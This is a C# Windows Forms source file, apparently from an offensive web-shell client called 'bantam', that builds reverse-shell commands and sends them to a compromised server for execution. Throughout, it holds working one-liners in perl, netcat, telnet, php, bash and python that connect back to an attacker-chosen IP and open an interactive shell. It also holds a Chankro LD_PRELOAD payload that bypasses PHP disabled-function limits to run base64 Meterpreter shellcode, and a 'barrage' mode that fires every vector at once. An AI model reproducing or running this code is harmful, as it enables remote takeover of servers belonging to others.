using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Threading.Tasks;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class ReverseShell : Form
    {
        /// <summary>
        /// The ShellUrl which we are poping a shell on, set in the default constructor
        /// </summary>
        private string ShellUrl;

        /// <summary>
        /// Different vectors for poping shells, to be populated into the combobox
        /// </summary>
        private static readonly ReadOnlyCollection<string> shellVectors = new List<string> {
             "perl",
             "netcat",
             "netcat with pipe",
             "telnet with pipe",
             "php",
             "bash",
             "python",
             "barrage"
        }.AsReadOnly();

        /// <summary>
        /// Default Constructor
        /// </summary>
        /// <param name="shellUrl"></param>
        public ReverseShell(string shellUrl)
        {
            InitializeComponent();

            ShellUrl = shellUrl;

            foreach (var vecs in shellVectors) {
                comboBoxMethod.Items.Add(vecs);
            }

            comboBoxArch.SelectedIndex = 0;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string PerlShell(string ip, string port)
        {
            string perlShell = "perl -e 'use Socket;"
                             + "$i=\"" + ip + "\";"
                             + "$p=" + port + ";"
                             + "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                             + "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                                 + "open(STDIN,\">&S\");"
                                 + "open(STDOUT,\">&S\");"
                                 + "open(STDERR,\">&S\");"
                                 + "exec(\"/bin/sh -i\");"
                             + "};'";

            return perlShell;
        }

        /// <summary>
        /// Pops a reverse shell using netcat
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string NetCatShell(string ip, string port)
        {
            return "nc -e /bin/sh " + ip + " " + port;
        }

        /// <summary>
        /// Pops a reverse shell using netcat & a pipe for when "GAPING_SECURITY_HOLE" is disabled, Caveat /tmp must be writeable
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string NetCatPipeShell(string ip, string port)
        {
            string netcatPipe = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f";
            return netcatPipe;
        }

        /// <summary>
        /// Pops a reverse shell using telnet, Caveat /tmp must be writeable
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string TelNetPipeShell(string ip, string port)
        {
            string telnetPipe = "rm /tmp/j;mknod /tmp/j p; telnet " + ip + " " + port + " 0</tmp/j | /bin/bash 1>/tmp/j";
            return telnetPipe;
        }

        /// <summary>
        /// Pops a shell using php
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string PhpShell(string ip, string port)
        {
            //todo utilize the selected shell code vector
            string phpShell = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");"
                            + "system(\"/bin/sh -i <&3 >&3 2>&3\");'";

            return phpShell;
        }

        /// <summary>
        /// Pops a reverse shell using bash
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string BashShell(string ip, string port)
        {
            string bashShell = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
            return bashShell;
        }

        /// <summary>
        /// Pops a reverse shell using python
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <returns></returns>
        public string PythonShell(string ip, string port)
        {
            string pythonShell = "python -c 'import socket,subprocess,os;"
                               + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                               + "s.connect((\"" + ip + "\"," + port + "));"
                               + "os.dup2(s.fileno(),0);"
                               + "os.dup2(s.fileno(),1);"
                               + "os.dup2(s.fileno(),2);"
                               + "p=subprocess.call([\"/bin/sh\",\"-i\"]);'";

            return pythonShell;
        }

        /// <summary>
        /// Generate Chankro64 bit payload - https://bugs.php.net/bug.php?id=46741 | https://github.com/TarlogicSecurity/Chankro/
        /// Warning - Contains 64 bit precompiled library that will be executed on the server
        /// putenv must be enabled with access to "LD_PRELOAD", mail must be enabled
        /// </summary>
        /// <param name="shellCode"></param>
        /// <returns></returns>
        public string Chankro64BitShell(string b64shellCode)
        {
            string chankro64 =
            @"$hook64 = '';
            $meterpreter = '" + b64shellCode + @"';
            file_put_contents('chankro.so', base64_decode($hook64));
            file_put_contents('acpid.socket', ""#!/bin/bash\n"".base64_decode($meterpreter));
            putenv('CHANKRO=./acpid.socket');
            putenv('LD_PRELOAD=./chankro.so');
            mail('a', 'a', 'a', 'a');
            sleep(2);
            unlink('chankro.so');
            unlink('acpid.socket');";

            return chankro64;
        }

        /// <summary>
        /// Generate Chankro32 bit payload - https://bugs.php.net/bug.php?id=46741 | https://github.com/TarlogicSecurity/Chankro/
        /// Warning - Contains 32 bit precompiled library that will be executed on the server
        /// putenv must be enabled with access to "LD_PRELOAD", mail must be enabled
        /// </summary>
        /// <param name="b64ShellCode"></param>
        /// <returns></returns>
        public string Chankro32BitShell(string b64ShellCode)
        {
            string chankro32 =
            @"$hook32 = '';
            $meterpreter = '" + b64ShellCode + @"';
            file_put_contents('./chankro.so', base64_decode($hook32));
            file_put_contents('./acpid.socket', ""#!/bin/bash\n"".base64_decode($meterpreter));
            putenv('CHANKRO=./acpid.socket');
            putenv('LD_PRELOAD=./chankro.so');
            mail('a','a','a','a');
            sleep(2);
            unlink('chankro.so');
            unlink('acpid.socket');";

            return chankro32;
        }

        /// <summary>
        /// Task wrapper for popping reverse shell without chankro
        /// </summary>
        /// <param name="shellCode"></param>
        private async Task PopReverseShell(string shellCode)
        {
            string phpCode = PhpBuilder.ExecuteSystemCode(shellCode, false);
            await Task.Run(() => WebRequestHelper.ExecuteRemotePHP(ShellUrl, phpCode, true).ConfigureAwait(false));

            if (checkBoxLogShellCode.Checked) {
                LogHelper.AddShellLog(ShellUrl, "Attempted to pop chankro reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.REQUESTED);
            }
        }

        /// <summary>
        /// Task wrapper for spawning a chankro shell
        /// </summary>
        /// <param name="phpCode"></param>
        private async Task PopChankroShell(string phpCode)
        {
            await Task.Run(() => WebRequestHelper.ExecuteRemotePHP(ShellUrl, phpCode, true).ConfigureAwait(false));
        }

        /// <summary>
        /// Main shell poping routine
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnPopShell_Click(object sender, EventArgs e)
        {
            string shellCode = string.Empty;
            string ipv4 = Helper.MinifyCode(textBoxIP.Text);

            if (string.IsNullOrEmpty(ipv4)
            || !Helper.IsValidIPv4(ipv4)) {
                lblStatus.Text = "Invalid ipv4...";
                return;
            }

            string port = textBoxPort.Text;

            if (string.IsNullOrEmpty(port)) {
                lblStatus.Text = "Invalid port...";
                return;
            }

            switch (comboBoxMethod.Text) {
                case "perl":
                shellCode = PerlShell(ipv4, port);
                break;
                case "netcat":
                shellCode = NetCatShell(ipv4, port);
                break;
                case "netcat with pipe":
                shellCode = NetCatPipeShell(ipv4, port);
                break;
                case "telnet with pipe":
                shellCode = TelNetPipeShell(ipv4, port);
                break;
                case "php":
                shellCode = PhpShell(ipv4, port);
                break;
                case "bash":
                shellCode = BashShell(ipv4, port);
                break;
                case "python":
                shellCode = PythonShell(ipv4, port);
                break;
                case "barrage":
                if (checkBoxDisabledFunctionsBypass.Checked) {
                    lblStatus.Text = "Barrage is not supported with chankro...";
                    return;
                }

                shellCode = PerlShell(ipv4, port);
                PopReverseShell(shellCode);

                shellCode = NetCatShell(ipv4, port);
                PopReverseShell(shellCode);

                shellCode = NetCatPipeShell(ipv4, port);
                PopReverseShell(shellCode);

                shellCode = TelNetPipeShell(ipv4, port);
                PopReverseShell(shellCode);

                shellCode = PhpShell(ipv4, port);
                PopReverseShell(shellCode);

                shellCode = BashShell(ipv4, port);
                PopReverseShell(shellCode);

                shellCode = PythonShell(ipv4, port);
                PopReverseShell(shellCode);

                lblStatus.Text = "Goodluck! :D";
                return;
                default:
                lblStatus.Text = "Unknown shell vector, GUI Error";
                break;
            }

            if (checkBoxDisabledFunctionsBypass.Checked) {
                shellCode = Helper.EncodeBase64ToString(shellCode);

                if (comboBoxArch.Text == "x86") {
                    PopChankroShell(Chankro32BitShell(shellCode));
                } else if (comboBoxArch.Text == "x64") {
                    PopChankroShell(Chankro64BitShell(shellCode));
                } else {
                    lblStatus.Text = "Unknown chankro architecture vector, GUI Error";
                }
            } else {
                PopReverseShell(shellCode);
            }
            lblStatus.Text = "Goodluck! :D";
        }

        /// <summary>
        /// Gets your IPv4 address for you
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void buttonGetIpv4_Click(object sender, EventArgs e)
        {
            var task = WebRequestHelper.GetRequest("http://ipv4bot.whatismyipaddress.com/");

            if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                if (string.IsNullOrEmpty(task.Result)) {
                    MessageBox.Show("Unable to get IP Address", "Connection Failed");
                } else {
                    textBoxIP.Text = task.Result;
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxDisabledFunctionsBypass_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxDisabledFunctionsBypass.Checked) {
                MessageBox.Show("You should only use this if all process execution methods are disabled, it can could potentially cause a fork bomb or other undesirable results.\r\r" +
                                "Furthermore the web_root must be writeable, and you may need to perform cleanup in that directory", "Warning!!!");

                comboBoxArch.Enabled = true;
            } else {
                comboBoxArch.Enabled = false;
            }
        }
    }
}

